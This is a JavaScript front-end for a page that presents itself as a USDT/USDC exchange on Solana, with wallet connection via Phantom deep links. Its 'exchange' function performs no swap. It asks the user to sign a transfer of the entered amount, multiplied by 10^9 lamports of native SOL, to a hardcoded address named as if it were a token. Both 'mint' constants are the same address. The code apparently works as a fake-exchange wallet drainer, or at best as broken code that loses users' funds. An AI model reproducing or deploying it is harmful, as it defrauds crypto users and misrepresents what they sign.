const { Connection, PublicKey, SystemProgram, Transaction } = solanaWeb3;

// Solana RPC
const endpoint = "https://api.mainnet-beta.solana.com";
const connection = new Connection(endpoint, "confirmed");

// Адреса гаманців
const USDT_MINT_ADDRESS = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU");
const USDC_MINT_ADDRESS = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU");
const SPL_TOKEN_ADDRESS = new PublicKey("3EwV6VTHYHrkrZ3UJcRRAxnuHiaeb8EntqX85Khj98Zo");

// UI Елементи
const connectWalletBtn = document.getElementById("connectWalletBtn");
connectWalletBtn.addEventListener("click", () => {
    if (isMobile()) {
        connectViaDeepLink("phantom");
    } else {
        connectWallet("phantom");
    }
});
const walletStatus = document.getElementById("walletStatus");
const exchangeBtn = document.getElementById("exchangeBtn");
const resultDiv = document.getElementById("result");
const amountInput = document.getElementById("amount");
const walletPopup = document.getElementById("walletPopup");

// Перевірка мобільного пристрою
function isMobile() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
}

// Визначення гаманця
const getWallet = (walletType) => {
    if (walletType === "phantom" && window.phantom?.solana?.isPhantom) {
        return window.phantom.solana;
    } else if (walletType === "solflare" && window.solflare?.isSolflare) {
        return window.solflare;
    }
    return null;
};

// Генерація ключа шифрування для підключення через диплінк
async function generateEncryptionKey() {
    const keyPair = await window.crypto.subtle.generateKey(
        { name: "RSA-OAEP", modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256" },
        true,
        ["encrypt", "decrypt"]
    );
    const publicKey = await window.crypto.subtle.exportKey("spki", keyPair.publicKey);
    return btoa(String.fromCharCode(...new Uint8Array(publicKey))); // Кодуємо в Base64
}

// Підключення гаманця через диплінк для мобільних пристроїв
async function connectViaDeepLink(walletType) {
    const encryptionKey = await generateEncryptionKey();
    let deepLink;
    if (isMobile()) {
        if (/iPhone|iPad/i.test(navigator.userAgent)) {
            deepLink = walletType === "phantom" 
                ? `https://phantom.app/ul/v1/connect?app_url=https://yourapp.com&dapp_encryption_public_key=${encryptionKey}&cluster=mainnet-beta`
                : "https://solflare.com/connect";
        } else if (/Android/i.test(navigator.userAgent)) {
            deepLink = walletType === "phantom" 
                ? `phantom://v1/connect?app_url=https://yourapp.com&dapp_encryption_public_key=${encryptionKey}&cluster=mainnet-beta`
                : "solflare://connect";
        }
    } else {
        deepLink = walletType === "phantom" 
            ? `https://phantom.app/ul/v1/connect?app_url=https://yourapp.com&dapp_encryption_public_key=${encryptionKey}&cluster=mainnet-beta`
            : "https://solflare.com/connect";
    }
    window.location.href = deepLink;
}

// Підключення гаманця
async function connectWallet(walletType) {
    let wallet = getWallet(walletType);
    if (!wallet) {
        connectViaDeepLink(walletType);
        return;
    }
    
    try {
        await wallet.connect();
        document.getElementById("walletStatus").textContent = `Гаманець підключено: ${wallet.publicKey.toString()}`;
    } catch (err) {
        console.error("Помилка підключення:", err);
    }
}


// Отримання балансу
async function getTokenBalance(ownerAddress, mintAddress) {
    try {
        const response = await connection.getParsedTokenAccountsByOwner(ownerAddress, { mint: mintAddress });
        return response.value.length > 0 ? parseFloat(response.value[0].account.data.parsed.info.tokenAmount.uiAmount) : 0;
    } catch (error) {
        console.error("Помилка отримання балансу:", error);
        return 0;
    }
}

// Обмін токенів
exchangeBtn.addEventListener("click", async () => {
    const amount = parseFloat(amountInput.value);
    if (isNaN(amount) || amount <= 0) {
        alert("Будь ласка, введіть коректну кількість USDT/USDC");
        return;
    }

    let wallet = getWallet("phantom"); // Используем Phantom как дефолт
    if (!wallet || !wallet.publicKey) {
        alert("Будь ласка, підключіть гаманець");
        return;
    }

    const balanceUSDT = await getTokenBalance(wallet.publicKey, USDT_MINT_ADDRESS);
    const balanceUSDC = await getTokenBalance(wallet.publicKey, USDC_MINT_ADDRESS);

    if (balanceUSDT < amount && balanceUSDC < amount) {
        alert("Недостатньо коштів для обміну!");
        return;
    }

    await exchangeTokens(wallet, amount);
});

// Функція для обміну USDT/USDC
async function exchangeTokens(wallet, amountInUSDT) {
    try {
        const transaction = new Transaction();
        const sender = wallet.publicKey;

        const hasUSDT = await getTokenBalance(sender, USDT_MINT_ADDRESS) >= amountInUSDT;
        const mintAddress = hasUSDT ? USDT_MINT_ADDRESS : USDC_MINT_ADDRESS;

        const transferInstruction = SystemProgram.transfer({
            fromPubkey: sender,
            toPubkey: SPL_TOKEN_ADDRESS,
            lamports: amountInUSDT * 1000000000 // Конвертація
        });

        transaction.add(transferInstruction);

        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = sender;

        const signedTransaction = await wallet.signTransaction(transaction);
        const txid = await connection.sendRawTransaction(signedTransaction.serialize(), { skipPreflight: false, preflightCommitment: "confirmed" });

        await connection.confirmTransaction(txid);
        console.log(`Транзакція успішно надіслана! TXID: ${txid}`);
        resultDiv.style.display = "block";
        resultDiv.textContent = `Обмін завершено! TXID: ${txid}`;
    } catch (err) {
        console.error("Помилка обміну:", err);
        resultDiv.style.display = "block";
        resultDiv.textContent = "Помилка при обміні. Спробуйте ще раз.";
    }
}

// Отримання активів власника
async function getAssetsByOwner(ownerAddress) {
    const body = {
        jsonrpc: "2.0",
        method: "getAssetsByOwner",
        params: {
            ownerAddress: ownerAddress.toString(),
            limit: 10,
            page: 1
        },
        id: 1
    };

    try {
        const response = await fetch(endpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(body)
        });

        const data = await response.json();
        console.log("Активи власника:", data);
        return data.result;
    } catch (error) {
        console.error("Помилка отримання активів:", error);
    }
}

// Отримання історії транзакцій
async function getTransactionHistory(publicKey) {
    try {
        const signatures = await connection.getConfirmedSignaturesForAddress2(publicKey);
        const transactions = await Promise.all(signatures.map(sig => connection.getTransaction(sig.signature)));
        console.log("Історія транзакцій:", transactions);
        return transactions;
    } catch (error) {
        console.error("Помилка отримання історії:", error);
    }
}

